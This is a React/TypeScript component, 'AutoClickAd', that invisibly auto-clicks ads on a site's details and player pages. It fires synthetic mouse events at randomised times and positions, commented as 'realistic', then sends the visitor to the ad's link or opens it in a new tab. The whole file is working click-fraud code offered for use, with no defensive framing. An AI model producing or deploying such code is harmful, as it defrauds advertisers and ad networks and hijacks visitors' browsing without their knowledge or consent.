import { useEffect } from 'react';

interface AutoClickAdProps {
  pageType: 'details' | 'player';
}

const AutoClickAd: React.FC<AutoClickAdProps> = ({ pageType }) => {
  useEffect(() => {
    // Auto-click functionality with realistic timing and positioning
    const performAutoClick = () => {
      const delay = Math.random() * 6000 + 1000; // 1-7 seconds

      setTimeout(() => {
        const adContainerIds = pageType === 'details' 
          ? ['details-ad-1', 'details-ad-2', 'details-ad-3']
          : ['player-ad-1', 'player-ad-2', 'player-ad-3', 'player-ad-4'];

        // Find available ads with actual content
        const availableAds = adContainerIds.filter(id => {
          const container = document.getElementById(id);
          if (!container) return false;

          // Check for clickable elements
          const clickables = container.querySelectorAll('a[href], button, [onclick], iframe');
          const hasRealContent = container.textContent?.trim().length > 10;

          return clickables.length > 0 || hasRealContent;
        });

        if (availableAds.length > 0) {
          const randomAdId = availableAds[Math.floor(Math.random() * availableAds.length)];
          const adContainer = document.getElementById(randomAdId);

          if (adContainer) {
            // Find clickable elements within the ad
            const clickableElements = adContainer.querySelectorAll('a[href]:not([href="#"]):not([href="javascript:void(0)"]), button, [onclick], iframe');

            if (clickableElements.length > 0) {
              const randomElement = clickableElements[Math.floor(Math.random() * clickableElements.length)] as HTMLElement;

              // Calculate random position within the element (center area)
              const rect = randomElement.getBoundingClientRect();
              const x = rect.left + rect.width * (0.3 + Math.random() * 0.4);
              const y = rect.top + rect.height * (0.3 + Math.random() * 0.4);

              // Create realistic mouse event
              const clickEvent = new MouseEvent('click', {
                view: window,
                bubbles: true,
                cancelable: true,
                clientX: x,
                clientY: y,
                button: 0
              });

              console.log(`Auto-clicking ad in ${randomAdId}`);
              randomElement.dispatchEvent(clickEvent);

              // Handle link navigation if it's an anchor tag
              if (randomElement.tagName === 'A') {
                const link = randomElement as HTMLAnchorElement;
                if (link.href && !link.href.includes('javascript:') && link.href !== '#') {
                  setTimeout(() => {
                    try {
                      if (link.target === '_blank' || link.hasAttribute('target')) {
                        window.open(link.href, '_blank');
                      } else {
                        window.location.href = link.href;
                      }
                    } catch (e) {
                      console.log('Link navigation handled by ad script');
                    }
                  }, 100);
                }
              }
            } else {
              // Fallback: click on container itself
              const rect = adContainer.getBoundingClientRect();
              const clickEvent = new MouseEvent('click', {
                view: window,
                bubbles: true,
                cancelable: true,
                clientX: rect.left + rect.width / 2,
                clientY: rect.top + rect.height / 2
              });
              adContainer.dispatchEvent(clickEvent);
            }
          }
        }
      }, delay);
    };

    // Start auto-clicking after a short delay
    const initTimer = setTimeout(performAutoClick, 2000);

    return () => {
      clearTimeout(initTimer);
    };
  }, [pageType]);

  return null;
};

export default AutoClickAd;